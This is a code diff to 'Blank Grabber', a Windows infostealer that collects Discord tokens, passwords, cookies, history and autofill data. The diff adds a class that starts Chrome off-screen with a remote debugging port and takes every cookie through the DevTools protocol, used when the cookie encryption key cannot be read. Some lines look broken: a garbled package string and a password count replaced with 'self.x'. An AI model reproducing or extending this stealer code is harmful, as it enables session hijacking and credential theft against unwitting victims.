@@ -2,7 +2,7 @@
 # Author: pastelrbx
 # Github: https://github.com/pastelrbx/Blank-Lib
 # Encoding: UTF-8
-import pip;pip.main(["install", "wheel", "tinyaes", "pyinstaller", "pycryptodomex", "urllib3"])
+import pip;pip.main(["install", "wheel", "tinyaes", "pyinstaller", "pycryptodomex", "urllib3", "websocket-client," "requests"])
 import base64
 import os
 import subprocess
@@ -18,6 +18,8 @@ import time
 import ctypes
 import logging
 import zlib
+import websocket
+import requests
 
 from threading import Thread
 from ctypes import wintypes
@@ -35,6 +37,72 @@ Logger = logging.getLogger("Blank Grabber")
 Logger.setLevel(logging.INFO)
 Logger.disabled = True
 
+
+class ChromeDevToolsWrapper: # thanks phemedrone
+    def __init__(self, executable_path, profile_name = None):
+        self.chrome_process = None
+        self.start_chrome(executable_path, profile_name)
+
+    def start_chrome(self, executable_path, profile_name = None):
+        args = [
+            executable_path,
+            f'--window-position=-2400,-2400',
+            '--remote-debugging-port=9222',
+        ]
+        if profile_name: args.append(f'--profile-directory="{profile_name}"')
+        self.chrome_process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(0.5)  # Allow Chrome to start
+
+    def extract_cookies(self):
+        websocket_url = self.extract_websocket_url()
+        if not websocket_url:
+            return []
+
+        cookies = self.get_cookies_from_devtools(websocket_url)
+        if self.chrome_process:
+            self.chrome_process.kill()
+        return cookies
+
+    def extract_websocket_url(self):
+        response = requests.get("http://localhost:9222/json")
+        
+        if response.status_code == 200:
+            json_data = response.json()
+            return json_data[0].get("webSocketDebuggerUrl", "").replace("ws://localhost:9222/", "")
+        return None
+
+    def get_cookies_from_devtools(self, websocket_url):
+        cookies = []
+        ws = websocket.WebSocket()
+
+        try:
+            ws.connect(f"ws://localhost:9222/{websocket_url}")
+            command = '{"id":1,"method":"Network.getAllCookies","params":{}}'
+            ws.send(command)
+            response = ws.recv()
+            json_cookies = json.loads(response)
+
+            if 'result' in json_cookies:
+                cookies = self.parse_cookies(json_cookies['result']['cookies'])
+        finally:
+            ws.close()
+
+        return cookies
+
+    @staticmethod
+    def parse_cookies(cookies_json):
+        cookies = []
+        for cookie in cookies_json:
+            cookies.append({
+                "name": cookie.get("name"),
+                "value": cookie.get("value"),
+                "domain": cookie.get("domain"),
+                "path": cookie.get("path"),
+                "expires": cookie.get("expires"),
+                "secure": cookie.get("secure"),
+                "httpOnly": cookie.get("httpOnly"),
+            })
+        return cookies
 
 class VmProtect:
 
@@ -504,7 +572,8 @@ class Browsers:
             cookies = list()
 
             if encryptionKey is None:
-                return cookies
+                devtools = ChromeDevToolsWrapper(self.BrowserPath)
+                return devtools.extract_cookies()
             
             cookiesFilePaths = list()
 
@@ -1600,7 +1669,7 @@ class BlankGrabber:
 
         collection = {
             "Discord Accounts" : self.DiscordTokensCount,
-            "Passwords" : self.PasswordsCount,
+            "Passwords" : self.x,
             "Cookies" : len(self.Cookies),
             "History" : self.HistoryCount,
             "Autofills" : self.AutofillCount,
